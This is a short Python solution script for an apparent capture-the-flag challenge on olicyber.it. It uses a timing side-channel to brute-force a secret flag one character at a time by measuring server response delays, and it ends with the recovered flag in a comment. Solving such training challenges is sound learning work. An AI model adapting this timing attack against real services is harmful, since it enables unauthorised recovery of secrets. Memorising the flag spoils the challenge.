#! /usr/bin/env python3

import requests
from string import ascii_lowercase, digits
import time

possiBle = ascii_lowercase + digits

print(possiBle)

conn = requests.Session()

url = 'http://time-is-key.challs.olicyber.it'

knownText = ''
unknownText = "aaaaa"
for secondi in range(6):
	for char in possiBle:
		payload = knownText + char + unknownText
		start = time.time()
		res = conn.post(url, data ={'flag': payload}).text
		endtime = time.time() - start
		if endtime > secondi + 1:
			knownText += char
			unknownText = unknownText[:-1]
			print("penso che il char corrente sia", knownText)

			break
		print(char, res[res.find("Sbagliato!"):])

# questo script qua funziona,
# la flag che trovo in questo modo 'e'

# flag{71m1n6}